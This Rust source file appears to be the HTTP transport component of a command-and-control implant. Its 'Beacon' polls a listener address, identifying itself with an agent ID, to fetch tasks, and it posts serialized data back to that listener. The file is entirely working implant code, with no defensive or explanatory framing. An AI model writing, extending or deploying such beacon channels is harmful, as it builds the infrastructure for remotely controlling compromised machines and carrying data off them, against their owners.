use super::Transport;
use crate::tasks::Task;
use crate::Beacon;
use reqwest;
use serde::Serialize;
use std::error::Error;

pub struct HttpConnection {}

impl HttpConnection {
    pub fn new() -> Self {
        HttpConnection {}
    }
}

impl Transport for HttpConnection {
    async fn fetch_tasks(&self, beacon: &Beacon) -> Result<Vec<Task>, Box<dyn Error>> {
        let client = reqwest::Client::new();
        let url = &beacon.listener_address;
        let response = client
            .get(url)
            .header("X-Agent-Id", &beacon.id)
            .send()
            .await?;

        if !response.status().is_success() {
            return Err(format!("Request failed with status: {}", response.status()).into());
        }

        if response.content_length() == Some(0) {
            return Ok(Vec::new());
        }

        let tasks = response.json::<Vec<Task>>().await?;

        Ok(tasks)
    }

    async fn post_data<T: Serialize>(
        &self,
        beacon: &Beacon,
        data: &T,
    ) -> Result<(), Box<dyn Error>> {
        let client = reqwest::Client::new();
        let url = &beacon.listener_address;
        let response = client
            .post(url)
            .header("X-Agent-Id", &beacon.id)
            .header("Content-Type", "application/json")
            .json(&data)
            .send()
            .await?;

        if !response.status().is_success() {
            return Err(format!("Request failed with status: {}", response.status()).into());
        }

        Ok(())
    }
}
